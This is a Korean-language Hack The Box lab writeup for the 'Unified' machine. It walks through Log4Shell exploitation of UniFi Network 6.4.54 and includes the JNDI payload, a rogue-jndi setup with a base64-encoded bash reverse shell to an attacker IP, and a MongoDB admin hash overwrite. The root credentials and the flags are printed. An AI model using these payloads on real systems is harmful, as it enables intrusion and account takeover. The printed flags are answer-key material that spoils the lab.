---
title: "Hack The Box - Unified Writeup"
date: 2026-04-07T20:40:00+09:00
categories:
  - Web Hacking
tags:
  - Hack The Box
  - Tier 2
  - Unified
  - Log4Shell
  - UniFi
  - MongoDB
  - SSH
last_modified_at: 2026-04-07T20:40:00+09:00
published: true
---
## 개요

Unified는 UniFi Network의 Log4Shell 취약점을 이용해 원격 명령 실행을 만들고, 내부 MongoDB에서 관리자 비밀번호 해시를 바꿔 웹 관리자로 로그인한 뒤, 설정 화면에서 root SSH 비밀번호를 확인해 최종 접근하는 문제

흐름은 아래와 같다

- 다중 웹 포트 식별
- UniFi 버전과 Log4Shell 영향 범위 확인
- LDAP 콜백으로 취약점 검증
- `rogue-jndi`로 리버스 셸 획득
- MongoDB 포트와 관리자 문서 확인
- `x_shadow` 교체로 관리자 비밀번호 재설정
- 관리 화면 로그인 후 root 비밀번호 확인
- SSH로 root 접속

## 1. 정보 수집과 서비스 식별

표면 분석 단계

먼저 전체 포트 확인

```bash
nmap -Pn -p- --min-rate 3000 --max-retries 2 -T4 10.129.91.232
```

- `-Pn`: 호스트 응답과 무관하게 스캔
- `-p-`: 전체 TCP 포트 스캔
- `--min-rate 3000`: 최소 속도 유지
- `--max-retries 2`: 재시도 횟수 제한
- `-T4`: 빠른 타이밍 템플릿

핵심 출력

```text
22/tcp   open  ssh
6789/tcp open  ibm-db2-admin
8080/tcp open  http-proxy
8443/tcp open  https-alt
8843/tcp open  unknown
8880/tcp open  cddbp-alt
```

다음 단계: 서비스 식별 스캔으로 웹 애플리케이션 범위 축소

```bash
nmap -Pn -sC -sV -p 22,6789,8080,8443,8843,8880 -T4 10.129.91.232
```

- `-sC`: 기본 NSE 스크립트 실행
- `-sV`: 버전 식별
- `-p`: 관심 포트만 정밀 확인

핵심 출력

```text
8080/tcp open  http            Apache Tomcat
|_http-title: Did not follow redirect to https://10.129.91.232:8443/manage
8443/tcp open  ssl/http
| http-title: UniFi Network
```

즉 실제 공격 대상은 `8443`에서 동작하는 UniFi Network다

로그인 화면에서 버전 `6.4.54`도 확인 가능

## 2. 취약점 확인과 공격 지점 식별

취약점 검증 단계

Metasploit에서 UniFi 관련 모듈을 찾는다

```bash
msfconsole
search unifi network
```

핵심 출력

```text
exploit/multi/http/ubiquiti_unifi_log4shell
```

모듈 정보를 보면 어떤 조건에서 취약한지 바로 나온다

```text
use exploit/multi/http/ubiquiti_unifi_log4shell
info
```

핵심 출력

```text
Description:
The Ubiquiti UniFi Network Application versions 5.13.29 through 6.5.53 are affected by the Log4Shell vulnerability
...
RPORT      8443
SRVPORT    389
...
the 'remember' field of a POST request to the /api/login endpoint
```

여기서 바로 정리되는 값

- 취약점 `CVE-2021-44228`
- 대상 포트 `8443`
- 취약 필드 `remember`
- 콜백 프로토콜 `LDAP`

로그인 요청은 아래 형태다

```http
POST /api/login HTTP/1.1
Host: 10.129.74.90:8443
Content-Type: application/json; charset=utf-8

{"username":"test","password":"test","remember":false,"strict":true}
```

이제 `remember` 값을 JNDI 문자열로 바꿔 보낸다

```text
${jndi:ldap://10.10.14.118:1389/o=tomcat}
```

## 3. LDAP 콜백 검증

원격 코드 실행 성립 여부 검증 단계

우선 확인: 네트워크 단 LDAP 유입

```bash
tcpdump -i tun0 port 389
```

- `-i tun0`: HTB VPN 인터페이스 지정
- `port 389`: LDAP 포트만 필터링

이 명령은 화면 변화보다 네트워크 콜백을 먼저 확인하는 용도다

`389` 포트로 대상 서버의 접속 시도가 보이면 JNDI 조회가 일어난 것으로 판단 가능

## 4. RogueJNDI 준비와 리버스 셸 획득

실제 원격 명령 실행 단계

필요한 도구 준비

```bash
sudo apt update
sudo apt install openjdk-11-jdk -y
sudo apt install maven -y
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi
mvn package
```

- `openjdk-11-jdk`: 자바 실행과 빌드 환경
- `maven`: 자바 프로젝트 빌드 도구
- `mvn package`: JAR 파일 빌드

리버스 셸 명령은 특수문자가 많으므로 base64로 감싸는 편이 안정적임

```bash
echo 'bash -c bash -i >&/dev/tcp/10.10.14.118/8888 0>&1' | base64
```

핵심 출력

```text
YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTE4Lzg4ODggMD4mMQo=
```

이 값을 `rogue-jndi`에 넣어 LDAP와 HTTP 서버를 동시에 띄운다

```bash
java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMTE4Lzg4ODggMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.14.118"
```

- `-jar`: 지정한 JAR 실행
- `--command`: 대상이 최종 실행할 명령
- `--hostname`: 공격자 서버 주소

정상 실행 시 아래 줄 확인

```text
Starting HTTP server on 0.0.0.0:8000
Starting LDAP server on 0.0.0.0:1389
Mapping ldap://10.10.14.118:1389/o=tomcat to artsploit.controllers.Tomcat
```

공격자 쪽 리스너 선실행

```bash
nc -lvnp 8888
```

다음 단계: Burp 등으로 취약 필드에 JNDI 페이로드 전송
성공 기준: 리버스 셸 연결

파이썬이 없는 환경이라 셸 안정화는 `script`를 쓴다

```bash
script /dev/null -c bash
```

- `script`: 터미널 세션 생성
- `/dev/null`: 로그 파일 버림
- `-c bash`: `bash` 실행

## 5. 내부 정찰과 MongoDB 접근

로컬 서비스 확인과 자격 증명 경로 탐색 단계

먼저 실행 중인 MongoDB 프로세스 확인

```bash
ps -ef | grep mongo
```

핵심 출력

```text
bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117
```

즉 MongoDB는 기본 포트 `27017`이 아니라 `27117`에서 동작

기본값 접속 시 실패

```bash
mongo
```

핵심 출력

```text
connecting to: mongodb://127.0.0.1:27017
exception: connect failed
```

포트를 명시해 다시 접속

```bash
mongo --port 27117
```

- `--port 27117`: 비표준 포트 지정

접속 후 데이터베이스 확인

```javascript
show databases
use ace
db.admin.find()
```

핵심 출력

```text
ace       0.002GB
ace_stat  0.000GB
admin     0.000GB
```

```text
{ "_id" : ObjectId("61ce278f46e0fb0012d47ee4"), "name" : "administrator", "email" : "administrator@unified.htb", "x_shadow" : "$6$..." }
```

여기서 중요한 값

- 기본 데이터베이스 이름 `ace`
- 관리자 문서의 `_id`
- 비밀번호 해시 필드 `x_shadow`

## 6. 관리자 비밀번호 재설정

자격 증명 변경 단계

새 비밀번호의 SHA-512 해시를 만든다

```bash
mkpasswd -m sha-512 hello
```

- `-m sha-512`: SHA-512 형식으로 생성

핵심 출력

```text
$6$Dl0eyQmJUu4LzsFj$6En8zNdCf.go899vONcYBqXhzUf85Gje.TRlslEBqS.tWlGbRtCSo7dWdAYPslKryka7r2Wg/10EOU6aRGwnq1
```

이제 MongoDB에서 관리자 비밀번호 해시를 바꾼다

```javascript
db.admin.update(
  { "_id" : ObjectId("61ce278f46e0fb0012d47ee4") },
  { $set: { "x_shadow" : "$6$Dl0eyQmJUu4LzsFj$6En8zNdCf.go899vONcYBqXhzUf85Gje.TRlslEBqS.tWlGbRtCSo7dWdAYPslKryka7r2Wg/10EOU6aRGwnq1" } }
)
```

핵심: `$set`

- 기존 문서 전체를 덮어쓰지 않음
- `x_shadow` 필드만 안전하게 교체

이후 웹 관리 화면에 아래 계정으로 로그인

```text
administrator
hello
```

사용자 플래그는 이미 셸 단계에서 확인 가능

```bash
cat /home/michael/user.txt
```

```text
6ced1a6a89e666c0620cdb10262ba127
```

## 7. root 자격 증명 확인과 최종 접근

관리 기능 악용과 최종 권한 확보 단계

관리자 로그인 후 설정 화면에서 root SSH 비밀번호를 확인 가능

핵심 값

```text
root
NotACrackablePassword4U2022
```

이 자격 증명으로 SSH 접속 시도

```bash
ssh root@10.129.93.126
```

로그인 후 플래그를 읽는다

```bash
cat /root/root.txt
```

루트 플래그

```text
e50bc93c75b634e4b272d2f771c33681
```

사용자 플래그

```text
6ced1a6a89e666c0620cdb10262ba127
```

## 정리

Unified의 핵심: Log4Shell 자체보다도, 취약점 검증에서 계정 탈취와 최종 접근까지 이어지는 전체 흐름

- 웹 포트와 UniFi 버전 식별
- `remember` 필드의 JNDI 처리 확인
- LDAP 콜백으로 취약점 성립 검증
- `rogue-jndi`로 셸 확보
- MongoDB `ace` 데이터베이스에서 관리자 문서 확인
- `x_shadow` 교체로 관리자 로그인
- 설정 화면에서 root SSH 비밀번호 확인

원격 코드 실행 하나가 내부 DB 조작과 최종 SSH 접속으로 이어지는 전형적인 애플리케이션 침투 문제
